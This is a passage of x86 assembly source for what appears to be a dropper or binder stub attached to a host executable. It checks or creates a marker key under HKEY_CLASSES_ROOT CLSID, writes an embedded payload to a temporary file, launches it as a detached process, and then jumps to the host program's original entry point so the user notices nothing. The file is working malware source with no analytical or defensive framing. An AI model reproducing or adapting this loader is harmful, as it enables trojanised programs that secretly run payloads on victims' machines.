	or	eax, eax
	jz	short @@Load

	lea	ebx, [ebp + @RegKey]
	lea	edx, [ebp + @hKey]
	call	eax, HKEY_CLASSES_ROOT, ebx, edx
	or	eax, eax
	jz	@@MainCode


	lea	edx, [ebp + @Func2_Name]
	call	@_GetProcAddress, DWORD PTR [ebp + @hLib], edx
	or	eax, eax
	jz	short @@Load
	lea	edx, [ebp + @hKey]
	call	eax, HKEY_CLASSES_ROOT, ebx, edx


@@Load:
	call	@_GetModuleHandleA, NULL

	call	@_VirtualAlloc, 0, MAX_PATH, MEM_COMMIT, PAGE_READWRITE
	mov	[ebp + @TempPath], eax
	call	@_GetTempPathA, MAX_PATH - 1, eax

	call	@_VirtualAlloc, 0, MAX_PATH, MEM_COMMIT, PAGE_READWRITE
	mov	[ebp + @TempFile], eax
	lea	edx, [ebp + @Prefix] 
	call	@_GetTempFileNameA, DWORD PTR [ebp + @TempPath], edx, 0, eax

	call	@_CreateFileA, DWORD PTR [ebp + @TempFile],\
		GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
	mov	[ebp + @FileHandle], eax
	lea	edx, [ebp + @Aux]
	call	@_WriteFile, eax, DWORD PTR [ebp + @Data],\
		DWORD PTR [ebp + @Data_], edx, 0
	call	@_CloseHandle, DWORD PTR [ebp + @FileHandle]

	call	@_VirtualAlloc, 0, PROCESS_INFORMATION_, MEM_COMMIT, PAGE_READWRITE
	mov	[ebp + @lPI], eax
	call	@_VirtualAlloc, 0, 68, MEM_COMMIT, PAGE_READWRITE
	mov	[ebp + @lSI], eax
	mov	ebx, eax				; EBX points to wShowWindow
	add	ebx, 30h

	call	@_GetStartupInfoA, DWORD PTR [ebp + @lSI]
	xor	eax, eax
	mov	[ebx], eax
	call	@_CreateProcessA, NULL, DWORD PTR [ebp + @TempFile], NULL, NULL, TRUE,\
		DETACHED_PROCESS, NULL, NULL,\
		DWORD PTR [ebp + @lSI],  DWORD PTR [ebp + @lPI]

	; Free some memory...
	call	@_VirtualFree, DWORD PTR [ebp + @TempPath], MAX_PATH, MEM_DECOMMIT
	call	@_VirtualFree, DWORD PTR [ebp + @TempFile], MAX_PATH, MEM_DECOMMIT
	call	@_VirtualFree, DWORD PTR [ebp + @lPI], PROCESS_INFORMATION_, MEM_DECOMMIT
	call	@_VirtualFree, DWORD PTR [ebp + @lSI], 68, MEM_DECOMMIT


@@MainCode:
	mov	eax, [ebp + @ImageBase_RVA]		; Restore ImageBase...
        add     eax, [ebp + @Entry_RVA]                 ; Get original entry point RVA

;	popa
;	popfd
        jmp     eax                                     ; Jump to original code


Redirectors:
@_GetTempPathA:
		DW	25FFh
		DD	?
@_GetTempFileNameA:
		DW	25FFh
		DD	?
@_CreateFileA:
		DW	25FFh
		DD	?
@_WriteFile:
		DW	25FFh
		DD	?
@_CloseHandle:
		DW	25FFh
		DD	?
@_VirtualAlloc:
		DW	25FFh
		DD	?
@_VirtualFree:
		DW	25FFh
		DD	?
@_GetStartupInfoA:
		DW	25FFh
		DD	?
@_CreateProcessA:
		DW	25FFh
		DD	?
@_GetModuleHandleA:
		DW	25FFh
		DD	?
@_LoadLibraryA:
		DW	25FFh
		DD	?
@_GetProcAddress:
		DW	25FFh
		DD	?


Entry_RVA       DD      ?
Ldr_RVA         DD      ?
ImageBase_RVA   DD      ?

Local_IT        DD      ?
Extrn_IT        DD      ?
Thunks          DD      0
MyThunks	DD	FuncN

DLL_Name	DB	"ADVAPI32.DLL", NULL
Func1_Name	DB	"RegOpenKeyA", NULL
Func2_Name	DB	"RegCreateKeyA", NULL
hKey		DD	?
hLib		DD	?

TempPath	DD	?
TempFile	DD	?
Prefix		DB	"~ZYXW", NULL
FileHandle	DD	?
Aux		DD	?

lSI		DD	?
lPI		DD	?

RegKey		DB	"CLSID\"
Mark_		EQU	39
Mark		DB	Mark_ DUP (?)

Data_		DD	?
Data		DD	?

padder = Enc_Len MOD 4
IF padder
 _pad           DB      padder DUP (?)
ENDIF

Ldr_End:

END Start
